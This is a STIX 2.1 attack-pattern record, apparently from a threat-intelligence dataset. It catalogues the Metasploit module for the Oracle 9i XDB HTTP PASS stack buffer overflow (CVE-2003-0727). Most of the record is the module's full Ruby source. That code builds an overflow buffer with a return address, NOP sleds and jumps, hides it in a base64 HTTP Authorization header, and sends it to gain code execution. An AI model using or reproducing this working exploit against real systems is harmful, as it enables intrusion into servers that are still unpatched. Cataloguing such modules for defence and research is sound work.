{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--233e11d5-c9f6-4477-9ae9-f925f6fba0de",
    "created": "2024-08-14T16:52:59.942573Z",
    "modified": "2024-08-14T16:52:59.942577Z",
    "name": "Oracle 9i XDB HTTP PASS Overflow (win32)",
    "description": " This module exploits a stack buffer overflow in the authorization code of the Oracle 9i HTTP XDB service. David Litchfield has illustrated multiple vulnerabilities in the Oracle 9i XML Database (XDB), during a seminar on \"Variations in exploit methods between Linux and Windows\" presented at the Blackhat conference. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/oracle9i_xdb_pass.rb",
            "external_id": "oracle9i_xdb_pass.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2003-0727"
        },
        {
            "source_name": "reference",
            "url": "http://www.blackhat.com/presentations/bh-usa-03/bh-us-03-litchfield-paper.pdf"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Oracle 9i XDB HTTP PASS Overflow (win32)',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in the authorization\n        code of the Oracle 9i HTTP XDB service. David Litchfield,\n        has illustrated multiple vulnerabilities in the Oracle\n        9i XML Database (XDB), during a seminar on \"Variations\n        in exploit methods between Linux and Windows\" presented\n        at the Blackhat conference.\n      },\n      'Author'         => [ 'MC' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2003-0727'],\n          ['OSVDB', '2449'],\n          ['BID', '8375'],\n          ['URL', 'http://www.blackhat.com/presentations/bh-usa-03/bh-us-03-litchfield-paper.pdf'],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'Space'    => 400,\n          'BadChars' => \"\\x00\",\n          'PrependEncoder' => \"\\x81\\xc4\\xff\\xef\\xff\\xff\\x44\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Oracle 9.2.0.1 Universal', { 'Ret' => 0x60616d46 } ],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2003-08-18'))\n\n    register_options(\n      [\n        Opt::RPORT(8080)\n      ])\n  end\n\n  def check\n    connect\n    sock.put(\"GET / HTTP/1.0\\r\\n\\r\\n\")\n    resp = sock.get_once\n    disconnect\n\n    if (resp =~ /9\\.2\\.0\\.1\\.0/)\n      return Exploit::CheckCode::Appears\n    end\n      return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    connect\n\n    sploit =  rand_text_english(4, payload_badchars) + \":\"\n    sploit << rand_text_english(442, payload_badchars)\n    sploit << \"\\xeb\\x64\" + make_nops(2) + [target.ret].pack('V')\n    sploit << make_nops(266) + \"\\xeb\\x10\" + make_nops(109) + payload.encoded\n\n    req  = \"Authorization: Basic #{Rex::Text.encode_base64(sploit)}\\r\\n\\r\\n\"\n\n    res  = \"GET / HTTP/1.1\\r\\n\" + \"Host: #{rhost}:#{rport}\\r\\n\" + req\n\n    print_status(\"Trying target %s...\" % target.name)\n\n    sock.put(res)\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2003-08-18",
    "x_mitre_platforms": [
        "win'"
    ]
}